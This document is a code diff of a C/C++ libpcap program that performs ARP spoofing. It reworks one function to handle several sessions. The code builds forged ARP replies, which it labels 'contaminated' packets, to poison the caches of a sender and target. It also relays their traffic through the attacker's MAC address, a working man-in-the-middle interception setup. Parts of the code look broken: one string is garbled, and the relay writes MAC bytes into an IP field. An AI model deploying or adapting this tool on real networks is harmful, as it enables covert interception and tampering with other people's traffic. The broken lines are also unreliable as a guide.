@@ -229,161 +229,172 @@ temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], te
     return (void*)(sender_mac);
 }
 
-void Manage_Session(struct Parameter_Pthread* pt3){
+//void Manage_Session(struct Parameter_Pthread* pt3){
+void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pcap_t* handle, int num_of_parameter){
     struct pcap_pkthdr* header;
     const u_char* packet;
+    int session_Number = 0;
+    int count = 0; // Prevention of Duplication
 
-    int res = pcap_next_ex(pt3->handle, &header, &packet);
+    int res = pcap_next_ex(handle, &header, &packet);
     if (res == -1 || res == -2) return ;
-    printf("\n@ ######################## @\n");
-    printf("[ -- Session < %d > %u Bytes captured -- ]\n", pt3->session_Number, header->caplen);
 
-    printf("[ -------_Ethernet_------- ]\n");
-    uint8_t tmp = 0; // Ethernet header size
-    int isCorrect = 0;
-    Ethernet_header eh;
-    tmp = eh.Print_Eth(packet);
-    isCorrect = eh.Check_Eth(packet, pt3->smac, pt3->tmac, pt3->attack_mac);
+    for(int i = 0; i < num_of_parameter; i++){
+        if(count == 1){
+            break;
+        }
+        session_Number = i+1;
+        printf("\n@ ######################## @\n");
+        printf("[ -- Session < %d > %u Bytes captured -- ]\n", session_Number, header->caplen);
 
-    printf("[ isCorrect : %d ]\n", isCorrect);
-    // Check spoofed packets
-    if(isCorrect == 2){
-        for(int x = 0; x < SESSION_NUM; x++){
-            if(pt3->session_Number == x){
-                printf("[ --_Session Number_-- : %d ]\n", x);
-                break;
+        printf("[ -------_Ethernet_------- ]\n");
+        uint8_t tmp = 0; // Ethernet header size
+        int isCorrect = 0;
+        Ethernet_header eh;
+        tmp = eh.Print_Eth(packet);
+        isCorrect = eh.Check_Eth(packet, smac[i], tmac[i], attack_mac);
+
+        printf("[ isCorrect : %d ]\n", isCorrect);
+        // Check spoofed packets
+        if(isCorrect == 2){
+            for(int x = 0; x < SESSION_NUM; x++){
+                if(session_Number == x){
+                    printf("[ --_Session Number_-- : %d ]\n", x);
+                    break;
+                }
+            }
+            if(tmp == 1){
+                packet += 14;
+                char* tmp2; // IP protocol type
+                IP_header ih;
+                tmp2 = ih.Print_IP(packet);
+                if(tmp2 == NULL){
+                    printf("{ IP version is not IPv4 }\n");
+                    return ;
+                }
+                if(!strcmp(tmp2, "1")){
+                    printf("[ ---------_ICMP_--------- ]\n");
+                }
+                else if(!strcmp(tmp2, "6"))
+                    printf("[ ---------_TCP_--------- ]\n");
+                else if(!strcmp(tmp2, "11"))
+                    printf("[ ---------_UDP_--------- ]\n");
+                else
+                    printf("[ ------_Unknown Protocol_------ ]\n");
+                packet += 20;
+                TCP_header th;
+                UDP_header uh;
+                if(!strcmp(tmp2, "1")){
+                    printf("PING\n");
+                }
+                else if(!strcmp(tmp2, "6")){
+                    th.Print_TCP(packet);
+                }
+                else if(!strcmp(tmp2, "11")){
+                    uh.Print_UDP(packet);
+                }
+                else{
+                    printf("{ No Network Data here for this protocol! }\n");
+                }
+
+                // Relay
+                // change sender mac address to my mac address
+                packet -= 34;
+                struct ARP_header* Ah = (struct ARP_header*)(packet);
+                // sender's mac -> attacker's mac
+                tomar_mac_addr(Ah->src_mac_addr, attack_mac);
+                tomar_mac_addr(Ah->sender_mac_addr, attack_mac);
+
+                // attacker's mac -> target's mac
+                tomar_mac_addr(Ah->Destination_mac_addr, tmac[i]);
+                tomar_mac_addr(Ah->target_ip_addr, tmac[i]);
+
+                struct libnet_ethernet_hdr* eh = (struct libnet_ethernet_hdr*)(packet); // ether_dhost, ether_shost / u_int8_t
+                memcpy(eh->ether_dhost,  Ah->target_ip_addr, sizeof(Ah->target_ip_addr));
+                memcpy(eh->ether_shost, Ah->sender_mac_addr, sizeof(Ah->sender_mac_addr));
+
+                for(int i = 0; i < 2; i++){ // Send Relay Packet 2 times
+                    if(pcap_sendpacket(handle,  reinterpret_cast<u_char*>(eh), 42) != 0){
+                        perror("{ send packet error }");
+                        exit(1);
+                    }
+                }
+                Ethernet_header eh1;
+                eh1.Print_Eth(packet);
+                printf("[ Success to send Relay packet! ]\n");
+                count++;
             }
         }
-        if(tmp == 1){
-            packet += 14;
-            char* tmp2; // IP protocol type
-            IP_header ih;
-            tmp2 = ih.Print_IP(packet);
-            if(tmp2 == NULL){
-                printf("{ IP version is not IPv4 }\n");
-                return ;
-            }
-            if(!strcmp(tmp2, "6"))
-                printf("[ ---------_TCP_--------- ]\n");
-            else if(!strcmp(tmp2, "11"))
-                printf("[ ---------_UDP_-----orrect == 2){---- ]\n");
-            else
-                printf("[ ------_Unknown Protocol_------ ]\n");
-            packet += 20;
-            TCP_header th;
-            UDP_header uh;
-            if(!strcmp(tmp2, "6")){
-                th.Print_TCP(packet);
-            }
-            else if(!strcmp(tmp2, "11")){
-                uh.Print_UDP(packet);
-            }
-            else{
-                printf("{ No Network Data here for this protocol! }\n");
-            }
+        // Check broadcast packets sended by sender
+        else if(isCorrect == 11){
+            struct ARP_header* Ah2 = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
+            struct in_addr src_in_addr, target_in_addr;
 
-            // Relay
-            // change sender mac address to my mac address
-            packet -= 34;
-            struct ARP_header* Ah = (struct ARP_header*)(packet);
+            Ah2->frame_type = htons(ARP_FRAME_TYPE);
+            Ah2->mac_type = htons(ETHER_MAC_TYPE);
+            Ah2->prot_type = htons(IP_PROTO_TYPE);
+            Ah2->mac_addr_size = ETH_MAC_ADDR_LEN;
+            Ah2->prot_addr_size = IP_ADDR_LEN;
+            Ah2->op = htons(OP_ARP_REPLY);
 
-            // sender's mac -> attacker's mac
-            tomar_mac_addr(Ah->src_mac_addr, pt3->attack_mac);
-            tomar_mac_addr(Ah->sender_mac_addr, pt3->attack_mac);
+            // target -> sender
+            tomar_ip_addr(&src_in_addr, argv[i+2]);
+            tomar_ip_addr(&target_in_addr, argv[i+1]);
+            memcpy(Ah2->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
+            memcpy(Ah2->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
-            // attacker's mac -> target's mac
-            tomar_mac_addr(Ah->Destination_mac_addr, pt3->tmac);
-            tomar_mac_addr(Ah->target_ip_addr, pt3->tmac);
+            tomar_mac_addr(Ah2->Destination_mac_addr, smac[i]);
+            tomar_mac_addr(Ah2->target_mac_addr, smac[i]);
+            tomar_mac_addr(Ah2->src_mac_addr, attack_mac);
+            tomar_mac_addr(Ah2->sender_mac_addr, attack_mac);
+            bzero(Ah2->padding, 18);
 
-            char aa[13];
-            sprintf(aa, "%02x%02x%02x%02x%02x%02x", Ah->sender_mac_addr[0], Ah->sender_mac_addr[1], Ah->sender_mac_addr[2], Ah->sender_mac_addr[3], Ah->sender_mac_addr[4], Ah->sender_mac_addr[5]);
-
-            char bb[13];
-            sprintf(bb, "%02x%02x%02x%02x%02x%02x", Ah->target_ip_addr[0], Ah->target_ip_addr[1], Ah->target_ip_addr[2], Ah->target_ip_addr[3], Ah->target_ip_addr[4], Ah->target_ip_addr[5]);
-
-            printf("[ Attacker mac : %s ]\n", pt3->attack_mac);
-            printf("[ Sender mac : %s ]\n", pt3->smac);
-            printf("[ Changed sender mac address : %s ]\n", aa);
-            printf("[ Target mac address : %s ]\n", pt3->tmac);
-            printf("[ Changed target mac address: %s ]\n", bb);
-            for(int i = 0; i < 2; i++){ // Send Relay Packet 2 times
-                if(pcap_sendpacket(pt3->handle,  reinterpret_cast<u_char*>(Ah), 42) != 0){
+            // attack 2 times
+            for(int i = 0 ; i < 2; i++){
+                if(pcap_sendpacket(handle,  reinterpret_cast<u_char*>(Ah2), 42) != 0){
                     perror("{ send packet error }");
                     exit(1);
                 }
+                printf("[ Success to send contaminated packet! ( Broadcast ) ( %d ) ]\n", i);
+                count++;
             }
-            Ethernet_header eh1;
-            eh1.Print_Eth(packet);
-            printf("[ Success to send Relay packet! ]\n");
         }
-    }
-    // Check broadcast packets sended by sender
-    else if(isCorrect == 11){
-        struct ARP_header* Ah2 = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
-        struct in_addr src_in_addr, target_in_addr;
+        // Check unicast packets sended by sender to target
+        else if(isCorrect == 101){
+            struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
+            struct in_addr src_in_addr, target_in_addr;
+            attack_packet->frame_type = htons(ARP_FRAME_TYPE);
+            attack_packet->mac_type = htons(ETHER_MAC_TYPE);
+            attack_packet->prot_type = htons(IP_PROTO_TYPE);
+            attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
+            attack_packet->prot_addr_size = IP_ADDR_LEN;
+            attack_packet->op = htons(OP_ARP_REPLY);
 
-        Ah2->frame_type = htons(ARP_FRAME_TYPE);
-        Ah2->mac_type = htons(ETHER_MAC_TYPE);
-        Ah2->prot_type = htons(IP_PROTO_TYPE);
-        Ah2->mac_addr_size = ETH_MAC_ADDR_LEN;
-        Ah2->prot_addr_size = IP_ADDR_LEN;
-        Ah2->op = htons(OP_ARP_REPLY);
+            tomar_ip_addr(&src_in_addr, argv[i+2]);
+            tomar_ip_addr(&target_in_addr, argv[i+1]);
 
-        // target -> sender
-        tomar_ip_addr(&src_in_addr, pt3->tip);
-        tomar_ip_addr(&target_in_addr, pt3->sip);
-        memcpy(Ah2->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
-        memcpy(Ah2->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
+            tomar_mac_addr(attack_packet->Destination_mac_addr, smac[i]);
+            tomar_mac_addr(attack_packet->target_mac_addr, smac[i]);
+            tomar_mac_addr(attack_packet->src_mac_addr, attack_mac);
+            tomar_mac_addr(attack_packet->sender_mac_addr, attack_mac);
 
-        tomar_mac_addr(Ah2->Destination_mac_addr, pt3->smac);
-        tomar_mac_addr(Ah2->target_mac_addr, pt3->smac);
-        tomar_mac_addr(Ah2->src_mac_addr, pt3->attack_mac);
-        tomar_mac_addr(Ah2->sender_mac_addr, pt3->attack_mac);
-        bzero(Ah2->padding, 18);
+            memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
+            memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
-        // attack 2 times
-        for(int i = 0 ; i < 2; i++){
-            if(pcap_sendpacket(pt3->handle,  reinterpret_cast<u_char*>(Ah2), 42) != 0){
-                perror("{ send packet error }");
-                exit(1);
+            bzero(attack_packet->padding, 18);
+
+            for(int i = 0 ; i < 2; i++){
+                if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
+                    perror("{ send packet error }");
+                    exit(1);
+                }
+                printf("[ Success to send contaminated packet! ( Unicast ) ( %d ) ]\n", i);
+                count++;
             }
-            printf("[ Success to send contaminated packet! ( Broadcast ) ( %d ) ]\n", i);
         }
-    }
-    // Check unicast packets sended by sender to target
-    else if(isCorrect == 101){
-        struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
-        struct in_addr src_in_addr, target_in_addr;
-        attack_packet->frame_type = htons(ARP_FRAME_TYPE);
-        attack_packet->mac_type = htons(ETHER_MAC_TYPE);
-        attack_packet->prot_type = htons(IP_PROTO_TYPE);
-        attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
-        attack_packet->prot_addr_size = IP_ADDR_LEN;
-        attack_packet->op = htons(OP_ARP_REPLY);
-
-        tomar_ip_addr(&src_in_addr, pt3->tip);
-        tomar_ip_addr(&target_in_addr, pt3->sip);
-
-        tomar_mac_addr(attack_packet->Destination_mac_addr, pt3->smac);
-        tomar_mac_addr(attack_packet->target_mac_addr, pt3->smac);
-        tomar_mac_addr(attack_packet->src_mac_addr, pt3->attack_mac);
-        tomar_mac_addr(attack_packet->sender_mac_addr, pt3->attack_mac);
-
-        memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
-        memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
-
-        bzero(attack_packet->padding, 18);
-
-        for(int i = 0 ; i < 2; i++){
-            if(pcap_sendpacket(pt3->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
-                perror("{ send packet error }");
-                exit(1);
-            }
-            printf("[ Success to send contaminated packet! ( Unicast ) ( %d ) ]\n", i);
+        else{
+            printf("{ This packet has no relation with this program. }\n");
         }
-    }
-    else{
-        printf("{ This packet has no relation with this program. }\n");
     }
 }
 
